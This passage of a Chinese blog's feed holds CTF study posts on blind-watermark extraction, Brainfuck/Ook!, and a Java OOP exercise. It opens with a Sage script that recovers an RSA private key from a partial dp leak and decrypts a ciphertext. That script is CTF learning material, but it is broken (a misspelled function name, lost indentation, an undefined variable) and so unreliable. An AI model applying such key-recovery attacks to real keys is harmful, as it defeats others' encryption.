class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>dp0 = <br>e = <br>n = <br>kbits = <br><br>P.&lt;x&gt; = PolynoimalRing(Zmod(n))<br>tmp = inverse(e,n)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>f = dp0 &lt;&lt; kbits + x + tmp * (k - <span class="hljs-number">1</span>)<br>root = small_roots(X = <span class="hljs-number">2</span>^kbits,beta = <span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> root:<br>dp = dp0 &lt;&lt; kbits + root<br>x = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br><span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>        p_us = x//i +<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p_us == <span class="hljs-number">0</span>:<br>            p = p_us<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> p&lt;<span class="hljs-number">0</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-comment">#print(p)</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=inverse(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><strong>参考：</strong> <a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">RSA | Lazzaro</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC基础篇-盲水印</title>
    <link href="/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
    <url>/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>通常是两张看起来相同的图片，<br>目前我所知的对两张相同图片的处理方式只有两种：</p><ul><li><strong>对像素值进行运算：</strong> 使用<code>stegsolve</code>的<code>image combiner</code>对两张图片像素值进行异或，加减等。</li><li><strong>盲水印：</strong> 使用<code>bwmforpy3.py</code>脚本进行操作。接下来会介绍这种方法。</li></ul><h2 id="项目脚本"><a href="#项目脚本" class="headerlink" title="项目脚本"></a>项目脚本</h2><p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a><br>下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/chishaxie/BlindWaterMark.git<br></code></pre></td></tr></table></figure><p>先安装<code>opencv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install opencv-python<br></code></pre></td></tr></table></figure><p>升级pip3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install --upgrade pip setuptools wheel<br></code></pre></td></tr></table></figure><p>安装matplotlib</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install matplotlib<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bwmforpy3.py decode 1.png 2.png flag.png<br></code></pre></td></tr></table></figure><blockquote><p><strong>求助</strong>：这里有个遗留问题，使用<code>--oldseed</code>来兼容python2脚本random算法时会抛出错误<code>Random.shuffle() got an unexpected keyword argument &#39;random&#39;</code>。有大佬知道怎么回事可以告诉我。。</p></blockquote><h3 id="Python2版本"><a href="#Python2版本" class="headerlink" title="Python2版本"></a>Python2版本</h3><p><strong>简要：</strong><br>这里使用miniconda来配置python2.7环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda install opencv<br>conda install matplotlib<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 bwm.py decode 00000000.png 00000232.png flag.png<br></code></pre></td></tr></table></figure><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>有时候也可以用一款名为<code>WaterMark</code>的工具，包括文字水印和图片水印。<br>论坛链接<a href="https://www.52pojie.cn/thread-1980917-1-1.html">盲水印工具WaterMark.exe - 吾爱破解 - 52pojie.cn</a><br><img src="/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%9B%B2%E6%B0%B4%E5%8D%B0/file-20250405202453394.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC基础篇-Brainfuck</title>
    <link href="/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-Brainfuck&amp;Ook!/"/>
    <url>/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-Brainfuck&amp;Ook!/</url>
    
    <content type="html"><![CDATA[<p>今天我们来学习一下Brainfuck语言以及Ook!语言，它们是MISC中的基础知识，一般会出在签到题。</p><h1 id="BrainFuck"><a href="#BrainFuck" class="headerlink" title="BrainFuck"></a>BrainFuck</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Brainfuck是<strong>最小</strong>的，<strong>图灵完备</strong>的语言。</p><blockquote><p><strong>图灵完备</strong>可以简单理解为任何可用算法解决的问题，都可用这个编程语言去解决。</p></blockquote><p><strong>结构：</strong> Brainfuck是由一个<strong>指针</strong>和一个<strong>数组</strong>组成，如下</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">指针：    ↓<br>数组：0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<br></code></pre></td></tr></table></figure><p><strong>组成：</strong> 它只由<strong>8种</strong>字符组成</p><ul><li><code>&gt;</code>: 指针向右移动一格。</li><li><code>&lt;</code>: 指针向左移动一格。</li><li><code>+</code>: 使指针当前格的字节数加1。</li><li><code>-</code>: 使指针当前格的字节数减1.</li><li><code>.</code>: 把当前格数按ASCII表输出到终端。</li><li><code>,</code>: 接收一个字节的输入，将其值存储在数据指针的字节中。</li><li><code>[</code>: 当前值为0时，程序跳转至与之对应的<code>]</code>之后；否则程序正常执行。</li><li><code>]</code>: 程序跳转回与之对应的<code>[</code>处。</li></ul><h2 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h2><h3 id="1-表示字母’A’"><a href="#1-表示字母’A’" class="headerlink" title="1.表示字母’A’"></a>1.表示字母’A’</h3><p>已知A的ASCII对应值为65，想必你一定会想到下面的表示方法：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p>虽然有点蠢，但不失为一种方法。下面我们来学习改进后的方法。</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++</span><br><span class="hljs-title">[</span><br>&gt;<span class="hljs-literal">+++++++++++++</span><br>&lt;<span class="hljs-literal">-</span><br><span class="hljs-title">]</span><br>&gt;<span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p>我们来分析这段代码，假设指针最开始指向数组<code>a[0]</code>，<br>第一行，进行<code>+++++</code>说明，<code>a[0]=5</code>；<br>第二行，当前指针指向<code>a[0]</code>，不等于0，因此进入循环；<br>第三行，<code>&gt;</code>指针右移一位，指向<code>a[1]</code>，接着13个<code>+</code>，即<code>a[1]=a[1]+13</code>；<br>第四行，<code>&lt;</code>指针左移，再次指向<code>a[0]</code>，接着<code>-</code>，即<code>a[0]=a[0]-1; 第五行，返回</code>[<code>; 第六行，</code>&gt;<code>右移指向</code>a[1]<code>，</code>.<code>输出</code>a[1]&#96;;</p><p>可以转换为C语言脚本来理解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>];<br>a[<span class="hljs-number">0</span>]=<span class="hljs-number">5</span>;<br>a[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(;a[<span class="hljs-number">0</span>]&gt;<span class="hljs-number">0</span>;a[<span class="hljs-number">0</span>]--)<br>&#123;<br>a[<span class="hljs-number">1</span>]+=<span class="hljs-number">13</span>;<br>&#125;<br><span class="hljs-comment">//这里输出ASCII的值，没有输出对应字符，实际应该输出字符。</span><br>print(a[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实现输出’Hello-MISC’"><a href="#实现输出’Hello-MISC’" class="headerlink" title="实现输出’Hello MISC’"></a>实现输出’Hello MISC’</h2><p>首先，我们要找到对应的ASCII值：</p><ul><li><code>H</code>: 72</li><li><code>e</code>: 101</li><li><code>l</code>: 108</li><li><code>o</code>: 111</li><li><code>空格</code> : 32</li><li><code>M</code>: 77</li><li><code>I</code>: 73</li><li><code>S</code>: 83</li><li><code>C</code>: 67<br>脚本实现如下:</li></ul><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span>&gt;<span class="hljs-literal">+++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">+++</span>&gt;<span class="hljs-literal">+++++++</span>&gt;<span class="hljs-literal">+++++++</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span><br>&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span><span class="hljs-literal">++++++++++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">---</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p>至此，你已经掌握了Brainfuck的编程方法，准备开启你的签到之旅吧！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2147388">一门能让你五分钟学会的语言-Brainfuck-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h1 id="Ook！"><a href="#Ook！" class="headerlink" title="Ook！"></a>Ook！</h1><h2 id="介绍（一本正经）"><a href="#介绍（一本正经）" class="headerlink" title="介绍（一本正经）"></a>介绍（一本正经）</h2><p>Ook！是一种基于Brainfuck的变种，意在让类人猿能够理解和使用，成为高级程序猿（bushi</p><h2 id="介绍（玩笑）"><a href="#介绍（玩笑）" class="headerlink" title="介绍（玩笑）"></a>介绍（玩笑）</h2><p>Ook！的语法能够与Brainfuck一一对应，因此上边的学会之后，下边也不成问题。</p><table><thead><tr><th align="center">Brainfuck</th><th align="center">Ook!</th><th align="center">Short Ook!</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">Ook. Ook?</td><td align="center">. ?</td></tr><tr><td align="center">&lt;</td><td align="center">Ook? Ook.</td><td align="center">? .</td></tr><tr><td align="center">+</td><td align="center">Ook. Ook.</td><td align="center">. .</td></tr><tr><td align="center">-</td><td align="center">Ook! Ook!</td><td align="center">! !</td></tr><tr><td align="center">.</td><td align="center">Ook! Ook.</td><td align="center">! .</td></tr><tr><td align="center">,</td><td align="center">Ook. Ook!</td><td align="center">. !</td></tr><tr><td align="center">[</td><td align="center">Ook! Ook?</td><td align="center">! ?</td></tr><tr><td align="center">]</td><td align="center">Ook? Ook!</td><td align="center">? !</td></tr></tbody></table><p>上文中的<code>Hello MISC</code>，换成Ook!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Ook!">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. <br></code></pre></td></tr></table></figure><p>另一种表示<code>short Ook!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Ookbr></code></pre></td></tr></table></figure><h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java简单项目实现</title>
    <link href="/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>面向对象程序设计（OOP）：</strong> 以<strong>对象</strong>为核心的程序设计范式，将程序中的数据和操作的方法<strong>封装</strong>在一起。<br><strong>面向过程程序设计（POP）：</strong> 以<strong>过程</strong>为中心的程序设计范式，将程序分解为一系列的<strong>函数调用</strong>，每个函数完成特定功能，程序执行顺序是函数的顺序调用。<br><strong>区别：</strong></p><ul><li><strong>核心不同：</strong> 前者以对象为核心，后者以过程为核心。</li><li><strong>侧重点不同：</strong> 前者侧重对象的封装和交互，后者侧重函数的顺序调用。</li><li><strong>代码复用性不同：</strong> 前者通过<strong>继承和多态</strong>，复用性更高；后者通过函数调用，复用性相对较低。</li><li><strong>可维护性：</strong> 前者程序结构清晰，可维护性好；后者结构相对复杂，难以维护。</li></ul><p><strong>面向对象优点：</strong></p><ul><li><strong>封装性：</strong> 将类的数据和实现细节封装起来，对外提供简洁的接口。</li><li><strong>继承性：</strong> 通过继承机制实现代码的复用。</li><li><strong>多态性：</strong> 能够实现不同类之间的灵活转换</li><li><strong>可维护性：</strong> 封装和继承使面向对象有较高的可读性和可维护性。</li></ul><p><strong>抽象：</strong> 抽象使对现实世界中复杂事物的简化与概括，通过抽象事物的共性和本质特征，忽略细节，形成一个更通用的模型。<br><strong>封装：</strong> 将对象的属性和方法封装在一起，隐藏内部细节，只暴露必要接口。可保护对象的内部状态，防止外部的非法访问，同时提供一个简洁的接口供外部使用。<br><strong>继承：</strong> 一种代码复用机制，允许一个子类继承父类的属性和方法。子类可以扩展或修改父类的行为，同时继承父类的多有非私有属性和方法。<br><strong>多态：</strong> 允许不同的对象对同一消息做出不同回应，即同一个接口可以被不同的实例以不同的方式实现。多态性分为 <strong>编译时多态</strong> 和 <strong>运行时多态</strong>。</p><p><strong>对象：</strong> 一个自包含的实体，用一组可识别的特征和行为来标识。<br><strong>类：</strong> 具有相同属性和功能的对象的抽象集合。<br><strong>类和对象关系：</strong> 对象是类的具体实例，具有类定义的属性和方法；类是对象的模板，定义了对象的结构和行为。如对于<code>Person</code>类，定义属性<code>name</code>、<code>age</code>和方法<code>sayHello</code>，此时可通过类来创建对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person1.name = <span class="hljs-string">&quot;Alice&quot;</span>;<br>        person1.age = <span class="hljs-number">25</span>;<br>        person1.sayHello();            <br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person2.name = <span class="hljs-string">&quot;Bob&quot;</span>;<br>        person2.age = <span class="hljs-number">30</span>;<br>        person2.sayHello();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时<code>person1</code>和<code>person2</code>就是类<code>Person</code>的具体实例，具有其的属性和方法。<br><strong>类与C语言中的类型的不同：</strong> </p><ul><li><p>类含有方法，类型不含有方法。</p></li><li><p>类存储类型属性和方法，类型定义变量存储方式和大小。</p></li><li><p>java中的类支持面向对象的特性。</p><h2 id="Java程序中的类"><a href="#Java程序中的类" class="headerlink" title="Java程序中的类"></a>Java程序中的类</h2></li><li><p><strong>系统定义类：</strong> 如<code>java.lang,java.util,java.io</code></p></li><li><p><strong>用户自定义类：</strong> 示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  String name;<br>  <span class="hljs-type">int</span> age;<br><br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;Hello! My name is &quot;</span> + name + <span class="hljs-string">&quot; and I am &quot;</span> + age + <span class="hljs-string">&quot; years old.&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br> person.name = <span class="hljs-string">&quot;Alice&quot;</span>;<br> person.age = <span class="hljs-number">25</span>;<br> person.sayHello();<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="访问控制符"><a href="#访问控制符" class="headerlink" title="访问控制符"></a>访问控制符</h2><ul><li><strong>概念：</strong> 是用于控制类、类的成员以及构造函数的访问权限的关键字。它们决定了哪些代码可以访问这些元素，从而实现封装和信息隐藏，保护类的内部实现细节。</li><li><strong>类别</strong>：<br><code>private</code> <code>default</code> <code>protect</code> <code>public</code></li><li><strong>修饰类：</strong><br><code>public</code> : 类可以在任何地方被访问。<br><code>default</code> : 类只能在同一个包内被访问。</li><li><strong>修饰域和方法：</strong><br><code>private</code>：只能在定义的类内部访问。<br><code>default</code>：只能在同一个包内访问。<br><code>protected</code>：可在同一个包内访问，也可在包的子类访问。<br><code>public</code>：可在任何地方访问。</li></ul><h1 id="编程运用"><a href="#编程运用" class="headerlink" title="编程运用"></a>编程运用</h1><p>编程实现计算正方形、三角形、矩形及圆形面积计算功能。</p><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a><strong>要求：</strong></h2><p>1）定义两个包，所有类几何形体类定义shape包中，含main()方法的类定义在app包中，<br>2）</p><ul><li>定义抽象类Shape,在其中定义area()方法计算并输出图形面积；</li><li>定义正方形、三角形、矩形及圆形类继承Shape类，实现各自的面积计算，其中长、宽、高、半径等基本几何要素设为private；</li><li>定义各类必要的构造方法及其它辅助方法；</li></ul><p>3）实现使用静态成员变量来计算内存中的实例化的各几何图形对象数目。</p><h2 id="实现："><a href="#实现：" class="headerlink" title="实现："></a><strong>实现：</strong></h2><p><strong>结构</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/src<br>|<span class="hljs-string">--/app</span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string">--Main</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/shape</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Square</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Triangle</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Rectangle</span><br><span class="hljs-string"> </span>|<span class="hljs-string">--Circle</span><br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Shape：</strong> 定义抽象类Shape，抽象类只能被继承，不能直接实例化</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>package shape;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Shape</span>&#123;<br>    <span class="hljs-comment">//定义area方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-built_in">double</span> <span class="hljs-title">area</span>()</span>;<br><br>    <span class="hljs-comment">//使用静态成员变量计算实例化的图形对象数目</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> Count = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Shape</span>()</span>&#123;<br>        Count++;<br>    &#125;<br>    <span class="hljs-comment">//提供接口以获取各几何体图形数目</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> <span class="hljs-title">ShapeCount</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> Count;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Square：</strong> 定义类Square，覆盖area方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-comment">//继承Shape类  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//定义边长  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> a;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">SquareCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><br>    <span 